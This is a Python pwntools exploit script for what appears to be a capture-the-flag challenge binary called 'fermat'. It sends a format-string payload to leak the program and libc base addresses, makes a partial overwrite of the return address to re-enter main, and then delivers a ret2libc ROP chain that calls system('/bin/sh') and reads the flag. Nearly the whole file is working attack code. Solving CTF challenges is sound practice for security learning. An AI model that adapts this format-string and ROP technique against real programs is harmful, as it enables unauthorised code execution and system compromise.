#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'fermat.chal.imaginaryctf.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x1269
breakrva 0x1228
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# pwndbg> checksec
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'


def exploit():
    global io
    io = initialize()

    # fmtstr offset - 6
    payload = b''
    payload += b'%41$p||%59$p||'
    payload += b'\x00' * (256+8-len(payload))
    payload += b'\x44' # partial overwrite, finding by IceCreamMan by luck he said lol
                       # returns to libc_start_main to exit, but partial overwrite causes
                       # to return to libc_start_main where it will calls main again
    io.send(payload)

    io.recvuntil(b'0x')
    elf.address = int(io.recvuntil(b'||', drop=True), 16) - elf.sym['main']
    libc.address = int(io.recvuntil(b'||', drop=True).strip(), 16) - 0x29e40

    sleep(0.2)
    payload = flat({
        256 + 8: [
            libc.address + 0x2a3e5, # pop rdi; ret;
            next(libc.search(b'/bin/sh\x00')),
            elf.address + 0x1274, # ret
            libc.sym['system']
        ]
    }, filler=b'\x00')
    io.send(payload)

    sleep(0.2)
    io.sendline(b'cat flag*')

    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()